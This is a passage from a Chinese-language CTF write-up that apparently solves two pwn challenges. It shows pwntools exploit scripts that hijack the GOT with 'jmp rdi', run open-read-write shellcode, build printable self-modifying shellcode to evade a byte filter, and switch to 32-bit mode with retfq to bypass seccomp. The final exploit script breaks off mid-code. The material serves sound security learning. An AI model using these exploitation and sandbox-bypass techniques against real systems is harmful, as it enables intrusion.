<p>后来突然意识到一点：写入 GOT 的堆中数据可能会被执行（没有 NX），有些 wp 上也是利用这一点进行入侵</p>
<p>但经测试发现这些数据没有执行权限，vmmap 打印的 heap 段也没有显示x权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap <span class="number">0x555555605160</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555605000</span>     <span class="number">0x555555626000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap] +<span class="number">0x160</span></span><br></pre></td></tr></table></figure>
<p>一番查找后得知：某些旧版本的操作系统可能不支持或不启用NX位，在这种情况下，即使关闭了NX位，堆仍然不会具有执行权限</p>
<p>接下来的思路就简单了，往 GOT 写入并执行8字节的指令，共有2次机会</p>
<p>其中最适合写指令的 GOT 表条目就是 <code>atoi got</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readn(nptr, <span class="number">16LL</span>);</span><br><span class="line"><span class="keyword">return</span> atoi(nptr);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x555555400e29</span>    call   atoi@plt                &lt;atoi@plt&gt;</span><br><span class="line">       nptr: <span class="number">0x7fffffffdc20</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>因为栈也是有执行权限的，如果在 <code>atoi got</code> 中写入 <code>jmp rdi</code> 就可以劫持控制流到栈上，然后执行一个 sys_read 就可以写入 ORW 的 shellcode</p>
<p>由于 heap 权限的问题没有解决，我这里只能参考网上的 exp 大概写一下</p>
<p>非完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;set exec-wrapper env &#x27;LD_PRELOAD=./libc-2.23.so&#x27;\nrun\nb *$rebase(0xE29)\n&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(challenge)</span></span><br><span class="line">    p = gdb.debug(challenge,c)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,c)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span>(index) == <span class="built_in">int</span>):</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,index)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span>(index) == <span class="built_in">int</span>):</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;-14&quot;</span>,<span class="number">0x8</span>,asm(<span class="string">&quot;jmp rdi&quot;</span>))</span><br><span class="line"></span><br><span class="line">shellcode_open = shellcraft.pushstr(<span class="string">&quot;flag&quot;</span>) + shellcraft.<span class="built_in">open</span>(<span class="string">&quot;rsp&quot;</span>)</span><br><span class="line">shellcode_read = shellcraft.read(<span class="string">&quot;rax&quot;</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line">shellcode_write = shellcraft.write(<span class="number">1</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode_open))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode_read))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode_write))</span><br><span class="line"></span><br><span class="line">shellcode_magic = asm(<span class="string">&quot;xor rax,rax;mov dl,0x80;mov rsi,rbp;push rax;pop rdi;syscall;jmp rbp&quot;</span>)</span><br><span class="line">cmd(shellcode_magic)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode_open+shellcode_read+shellcode_write))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), statically linked, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，NX</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A == stat) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<ul>
<li>白名单，要考虑 retfq 切换32位架构绕过 seccomp</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>直接执行 shellcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size = sys_read(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>uLL);</span><br><span class="line">size2 = size;</span><br><span class="line"><span class="keyword">if</span> ( shellcode[(<span class="keyword">int</span>)size - <span class="number">1</span>] == <span class="number">0xA</span> )</span><br><span class="line">&#123;</span><br><span class="line">  shellcode[(<span class="keyword">int</span>)size - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  size2 = size - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size2; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( shellcode[i] &lt;= <span class="number">0x1F</span> || shellcode[i] == <span class="number">0x7F</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">&#125;</span><br><span class="line">((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br></pre></td></tr></table></figure>
<ul>
<li>现在 shellcode 的范围为 <code>(0x1f,0x7f)</code></li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序对输入的 shellcode 有检查，建议用 nasm 手动编写 shellcode</p>
<p>可以利用 shellcode 创造一个 sys_read 绕过 shellcode 的检查，但在实际构造的过程中遇到了很多问题，最大的问题但就是无法使用 syscall（类似于 mov，add 之类的指令也会被过滤掉）</p>
<p>后来调试网上的 wp 发现了解决的办法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x57],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x58],cl</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x70</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">shellcode += append</span><br><span class="line">shellcode = asm(shellcode,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>直接输入 syscall 会被检测出来，但通过 <code>xor byte ptr[rax+offset],cl</code> 就可以将后面的二进制代码给计算为 syscall</li>
<li>对于这种会检查 shellcode 的程序来说，破解的关键点就是要利用合适的汇编指令来修改 shellcode 本身</li>
</ul>
<p>利用这个技巧可以获取到 syscall，但由于程序没法泄露，因此先执行 sys_mmap 申请一段固定位置的缓冲区，然后执行 sys_read 将数据写入其中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f6fba0ee031</span>    syscall  &lt;SYS_mmap&gt;</span><br><span class="line">       addr: <span class="number">0x40404040</span></span><br><span class="line">       len: <span class="number">0x7e</span></span><br><span class="line">       prot: <span class="number">0x7</span></span><br><span class="line">       flags: <span class="number">0x22</span></span><br><span class="line">       fd: <span class="number">0x0</span> (pipe:[<span class="number">270462</span>])</span><br><span class="line">       offset: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f6fba0ee057</span>    syscall  &lt;SYS_read&gt;</span><br><span class="line">       fd: <span class="number">0x0</span> (pipe:[<span class="number">270462</span>])</span><br><span class="line">       buf: <span class="number">0x40404040</span> ◂— <span class="number">0</span></span><br><span class="line">       nbytes: <span class="number">0x70</span></span><br></pre></td></tr></table></figure>
<p>最后的步骤就是 retfq 切换32位架构来绕过 seccomp 了</p>
<ul>
<li>指令 retfq 有两步操作：pop ip，pop cs（retf 是32位的 pop，retfq 是64位的 pop）<ul>
<li>cs=0x23 程序以32位模式运行</li>
<li>cs=0x33 程序以64位模式运行 </li>
</ul>
</li>
</ul>
<p>只要按照如下方法步骤 shellcode 就可以完成切换：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 0x72</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor byte ptr[rax+0x40],cl</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push 0x48</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    sub byte ptr[rax+0x41],cl</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    push 0x23</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>正常写入的 retfq 指令会被程序过滤，但还是可以通过 <code>sub byte ptr[rax+offset],cl</code> 进行调整</li>
</ul>
<p>在绕过 seccomp 后还是会因为没有 wrire 而打印不出 flag，因此只能通过 cmp 汇编指令来区别内存中的 flag，将 flag 爆破出来（类似于 SCTF-gadget 的思路）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./shellcode&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x40026D\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">    push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0x40 /*set rdx*/</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push 0x40 /*set r8*/</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">    push 